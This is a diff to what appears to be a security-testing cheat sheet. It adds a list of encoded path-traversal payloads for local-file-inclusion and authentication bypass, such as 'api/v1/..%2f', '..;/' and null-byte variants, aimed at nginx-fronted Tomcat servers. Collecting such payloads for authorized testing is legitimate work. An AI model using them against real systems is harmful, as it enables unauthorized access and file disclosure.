@@ -15,7 +15,19 @@ https://www.videlibri.de/xidel.html
 
 **Bypasses For LFI, Auth Bypass**
 ```
-..;/ 
+api/v1/..%2f
+api/v1/..;/
+api/v1/../
+api/v1..%00/
+api/v1/..%0d/
+api/v1/..%5c
+api/v1/..\
+api/v1/..%ff/
+api/v1/%2e%2e%2f
+api/v1/.%2e/
+api/v1/%3f (?)
+api/v1/%26 (&)
+api/v1/%23 (#)
 or
 /foo;x=x/bar/
 above tricks work well when you have a ngnix server in front of an tomcat
